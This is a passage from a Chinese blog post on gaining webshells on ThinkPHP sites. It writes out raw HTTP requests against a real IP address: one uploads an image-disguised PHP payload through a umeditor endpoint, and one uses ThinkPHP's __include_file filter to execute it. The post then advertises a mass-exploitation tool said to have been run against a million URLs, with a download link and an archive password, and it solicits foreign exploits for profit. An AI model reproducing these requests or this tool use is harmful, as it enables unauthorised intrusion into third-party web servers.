+<p>没打成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271519340.png" alt="没打成功"><br>我们换一个站点看看。注意看返回判断是否成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271522313.png" alt="成功"><br>访问webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271526124.png" alt="webshell"><br>exp poc 生成器 请参考<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251318">https://www.anquanke.com/post/id/251318</a></p>
+<h2 id="五-代码审计审计出上传漏洞进行文件"><a href="#五-代码审计审计出上传漏洞进行文件" class="headerlink" title="五:代码审计审计出上传漏洞进行文件"></a>五:代码审计审计出上传漏洞进行文件</h2><p>如果上述都打不成功那么使用代码审计审计出上传漏洞进行文件包含漏洞拿下权限。因为现在的站点都不是那么好拿了所以想办法拿到源代码代码审计只要有上传漏洞我们就可以拿下webshell。下面是我们对某编辑器审计上传漏洞从而拿下webshell<br>上传点</p>
+<pre class="language-java" data-language="java"><code class="language-java">GET <span class="token operator">/</span><span class="token keyword">static</span><span class="token operator">/</span><span class="token keyword">public</span><span class="token operator">/</span>umeditor<span class="token operator">/</span>php<span class="token operator">/</span>imageUp<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Origin</span><span class="token operator">:</span> <span class="token keyword">null</span>
+DNT<span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+返回
+HTTP/1.1 200 OK
+Server: nginx
+Date: Sun, 16 Jun 2024 06:28:45 GMT
+Content-Type: text/html;charset=utf-8
+Connection: close
+Vary: Accept-Encoding
+Content-Length: 142
+
+&#123;"originalName":null,"name":null,"url":null,"size":null,"type":null,"state":"\u6587\u4ef6\u5927\u5c0f\u8d85\u51fa post_max_size \u9650\u5236"&#125;
+
+上传制作好的图片马
+POST /static/public/umeditor/php/imageUp.php HTTP/1.1
+Host: 103.106.188.58
+Content-Length: 1754
+Cache-Control: max-age=0
+Origin: null
+DNT: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIbsNB4Zw4vqxb9kG
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span>
+<span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Encoding</span><span class="token operator">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> br
+<span class="token class-name">Accept</span><span class="token operator">-</span><span class="token class-name">Language</span><span class="token operator">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
+<span class="token class-name">Connection</span><span class="token operator">:</span> close
+
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span>
+<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"test.jpg"</span>
+<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Type</span><span class="token operator">:</span> image<span class="token operator">/</span>png
+
+PNG
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span>
+<span class="token class-name">Content</span><span class="token operator">-</span><span class="token class-name">Disposition</span><span class="token operator">:</span> form<span class="token operator">-</span>data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>
+
+<span class="token class-name">Submit</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token class-name">WebKitFormBoundaryIbsNB4Zw4vqxb9kG</span><span class="token operator">--</span></code></pre>
+<p>演示如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271533405.png" alt="审计上传"><br>包含拿下webshell</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 128
+
+_method=__construct&amp;filter[]=think\__include_file&amp;method=GET&amp;get[]=static/public/umeditor/php/upload/20240616/17185193394308.jpg</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271535946.png" alt="看到包含成功出现了php执行的特征"><br>拿下webshell<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271537644.png"></p>
+<h2 id="自动化getshel"><a href="#自动化getshel" class="headerlink" title="自动化getshel"></a>自动化getshel</h2><p> 基于上述getshell方式除了日志方式软件已经全部集成<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271541266.png" alt="集成上述漏洞exp到软件"><br> 实战测试<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271542467.png" alt="批量实战测试"><br> 软件已经发布请到github进行下载。另外关于thinkphp 软件集成的如果拿不下shell会自动记录可以getshell方式。当然后续遇到情况会在此集成一波exp。当然对于在2024年这个年代光靠软件是不行的还得靠自己有带审计基础那事半功倍。</p>
+<p>  在某一次无意中发现csdn有人宣传了一波。不得不说文笔不错。但是还是低调行事吧。不过这小子也挺有眼光的。这个软件截图如下</p>
+<p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271546768.png" alt="不得不说文笔不错"></p>
+<h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>WebFrameworkTools 5.3 - 红队综合渗透测试利器<br>来源网站: <a target="_blank" rel="noopener" href="https://blog.csdn.net/gitblog_00073/article/details/139490114">https://blog.csdn.net/gitblog_00073/article/details/139490114</a></p>
+<p><strong>项目介绍</strong></p> 
+<p>WebFrameworkTools 是一款强大的红队渗透测试工具&#xff0c;专为专业安全研究人员和渗透测试者设计。它集成了多种Web漏洞的POC和EXP&#xff0c;旨在简化和加速Web应用的安全评估过程。软件的最新版本5.3带来了诸多改进和新的漏洞库&#xff0c;使得安全专家能够快速响应新出现的威胁。</p> 
+<p><strong>项目技术分析</strong></p> 
+<p>该工具基于C#编程语言构建&#xff0c;其核心特性包括&#xff1a;</p> 
+<ol><li><strong>一键生成利用EXP</strong>: 即使不具备编程背景的用户也能轻松生成exploit。</li><li><strong>自定义DLL功能</strong>: 对于有经验的开发者来说&#xff0c;可以通过编写自己的插件来扩展工具功能。</li><li><strong>内置漏洞库</strong>: 包含了大量的Web漏洞exploits&#xff0c;涵盖各种流行框架和平台。</li><li><strong>模块内部化</strong>: 优化了软件结构&#xff0c;减小体积&#xff0c;便于携带和使用。</li><li><strong>支持.NET Core线程池</strong>: 提高性能&#xff0c;增强DLL执行效率。</li><li><strong>智能HTTP头部Fuzzer</strong>: 帮助识别潜在的脆弱点。</li><li><strong>自动化漏洞检测</strong>: 可处理大量URL&#xff0c;实现大规模测试。</li></ol> 
+<p><strong>应用场景</strong></p> 
+<p>WebFrameworkTools适用于以下场景&#xff1a;</p> 
+<ol><li><strong>企业安全建设</strong>: 用于合法授权的安全测试&#xff0c;帮助加强系统防护。</li><li><strong>渗透测试</strong>: 快速验证Web应用中的安全漏洞&#xff0c;有效提升测试效率。</li><li><strong>教育研究</strong>: 学习Web安全和渗透测试技巧&#xff0c;实践安全攻防。</li><li><strong>安全应急响应</strong>: 当新漏洞披露时&#xff0c;快速对目标环境进行安全扫描。</li></ol> 
+<p><strong>项目特点</strong></p> 
+<ol><li><strong>高度集成</strong>: 将多种工具&#xff08;如Vulmap、Http Fuzzer和Exploit Generator&#xff09;的功能融为一体&#xff0c;实现多功能一站式操作。</li><li><strong>便捷易用</strong>: 用户友好界面和一键式操作降低了使用门槛。</li><li><strong>持续更新</strong>: 持续跟进最新的漏洞信息&#xff0c;保持漏洞数据库的实时性。</li><li><strong>源代码安全</strong>: 开源计划即将启动&#xff0c;用户可审查代码确保透明度和安全性。</li><li><strong>合规性</strong>: 明确使用条款&#xff0c;强调合法使用&#xff0c;保护用户免受法律风险。</li></ol> 
+<p><strong>结论</strong></p> 
+<p>WebFrameworkTools 5.3以其全面的功能和易用性&#xff0c;成为了红队渗透测试领域的一款必备工具。无论是新手还是经验丰富的安全专家&#xff0c;都能从中受益。随着源代码即将对外开源&#xff0c;更多安全社区的贡献将会进一步丰富和完善这个项目。如果你从事相关领域的工作&#xff0c;不妨尝试一下WebFrameworkTools&#xff0c;让安全测试变得更加高效。</p>
+               
+<p>使用方式请参考博客或者github。或者加入频道。<br>下载地址:<br><a target="_blank" rel="noopener" href="https://www.upload.ee/files/16822507/hwok.7z.html">https://www.upload.ee/files/16822507/hwok.7z.html</a> 软件4月份版本exp更新至最新版本。框架是4月份的这个版本达到一定程度就会出现奔溃。所以设置了最大条数5000条。2024-10-31日软件过期。慢慢用吧。就别分享了自己用就行了。授权文件下载:<a target="_blank" rel="noopener" href="https://www.upload.ee/files/16851948/license.7z.html">https://www.upload.ee/files/16851948/license.7z.html</a> 解压密码:GL@kEzDu&amp;lh7 注意:下载的时候有广告如果弹到别的网站关闭。回到原来的地方在点击下载。直到弹出hwok.7z才是真正下载的软件。另一个也一样。自己琢磨吧。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感谢兄弟们推荐但是我们还是低调使用。另外关于上述文章说开源。那是对少部分人而不是大部分人。因为软件已经测试了100w条url 自动化全模块批量测试成功。如果大部分人有这个源代码会对互联网网站进行大批量攻击所以。我们有50套源代码。<br>测试100w 成功截图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271554216.png" alt="100w全模块测试成功"><br>测试详情截图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271556104.png" alt="100w url测试成功截图"><br>另外有国外exp poc的可以和我们联系以后国外的网站是巨大的市场。漏洞越多我们的软件可以至少批量100w条那么国外的市场就是我们的你懂的。后续不管是推广什么无敌的存在。另外关于源代码的请关注频道。准备编程知识和$当然这些频道有介绍。详细看频道吧。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">peiqiF4ck</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://peiqiF4ck.github.io/penetrationtest/2024/07/articles/9c5868b69dac664d/">https://peiqiF4ck.github.io/penetrationtest/2024/07/articles/9c5868b69dac664d/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">peiqiF4ck</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PenetrationTestingExample/">
+                                    <span class="chip bg-color">PenetrationTestingExample</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/securitytools/2024/08/articles/f7e10f7c4ce3b984/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261636141.png" class="responsive-img" alt="webframeworktools 漏洞集成公告一">
+                        
+                        <span class="card-title">webframeworktools 漏洞集成公告一</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            exp|poc渗透工具
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-08-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                    SecurityTools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/original/">
+                        <span class="chip bg-color">original</span>
+                    </a>
+                    
+                    <a href="/tags/PenetrationTest/">
+                        <span class="chip bg-color">PenetrationTest</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/codeaudit/2024/05/articles/c5b634cfecad72ae/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405311501204.png" class="responsive-img" alt="申瓯任意文件下载命令执行复盘审计">
+                        
+                        <span class="card-title">申瓯任意文件下载命令执行复盘审计</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            申瓯RCE C++代码审计
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-05-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CodeAudit/" class="post-category">
+                                    CodeAudit
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CodeAuditExample/">
+                        <span class="chip bg-color">CodeAuditExample</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="song"
+                   id="2630918223"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='one'
+                   order='list'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023-2025</span>
+            
+            <a href="/about" target="_blank">peiqiF4ck</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">62.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2023";
+                        var startMonth = "1";
+                        var startDate = "9";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
